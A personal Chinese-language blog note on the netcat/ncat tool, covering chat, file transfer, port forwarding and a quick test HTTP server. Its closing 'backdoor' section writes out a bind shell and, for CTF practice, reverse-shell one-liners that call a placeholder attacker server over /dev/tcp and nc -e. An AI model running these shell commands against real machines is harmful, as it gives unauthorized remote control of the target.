---
title: nc命令笔记
date: 2022-09-25 18:31:22
tag:
- nc
- ncat
- shell
categories: 
- shell

---


# 单聊
```shell script
# 服务端(收):
nc -l -k 8080
# 客户端(发):
nc 127.0.0.1 8080
```
双向聊天的话就开俩端口，互相监听；
`-l`就是listen、监听某个端口；
`-k`就是keep，不然客户端一断服务端也会关闭；keep的话服务端能保持不挂；

# 聊天室
这个可以安装一下nmap(`brew install nmap`)，然后就可以用ncat了:
```shell script
# 服务端以broker模式启动:
ncat -l 8888 --broker
```
然后多个客户端可以连到8888上聊天；（客户端用nc或ncat都行）

# 传输文件
(就是在聊天基础上加一个管道)
```shell script
# 接收方:
nc -l 8080 > out.jpeg
# 发送方:
nc 127.0.0.1 < WechatIMG104.jpeg
```

# 转发请求:
```shell script
mkfifo 2way
nc -k -l 8080 0<2way | nc 172.29.53.164 21445 1>2way
nc -k -l 8081 0<2way | nc 127.0.0.1 8080 1>2way
# 或
ncat -k -l 8080 0<2way | ncat 172.29.53.164 21445 1>2way
# 或
cat 2way | nc 172.29.53.164 21445 | nc -l 8080 > 2way
cat 2way | nc 127.0.0.1 8080 | nc -k -l 8081 > 2way
# 然后
echo -n "GET / HTTP/1.0\r\n\r\n" | nc -v -D 127.0.0.1 8080
```

## http服务
简单启动一个http服务方便测试:
```shell script
python -m SimpleHTTPServer 8081
```
然后在当前目录放上index.html就能返回文本给curl请求了。
这个在测试命令是否成功执行时能用，也能带回一些基本数据。


# 后门
其实就是转发端口上收到的东西到`/bin/bash`，从而执行命令:
```shell script
# 被控制端:
nc -l 8080 -e /bin/bash
# 控制端:
nc 127.0.0.1 8080
```
这个挺离谱的，试了一下可以ls目录，然后cd到某个目录里继续执行ls、回显结果。
感觉相当于为所欲为了。

CTF里的反向shell一般是先在自己的机器上:
```shell script
nc -nvlp 10086
```
然后想办法在目标机器上执行:
```shell script
bash -i >& /dev/tcp/<my_server_ip>/10086 0>&1
```
或者:
```shell script
nc -e /bin/sh <my_server_ip> 10086
```

# 参考资料
https://linux.cn/article-9190-1.html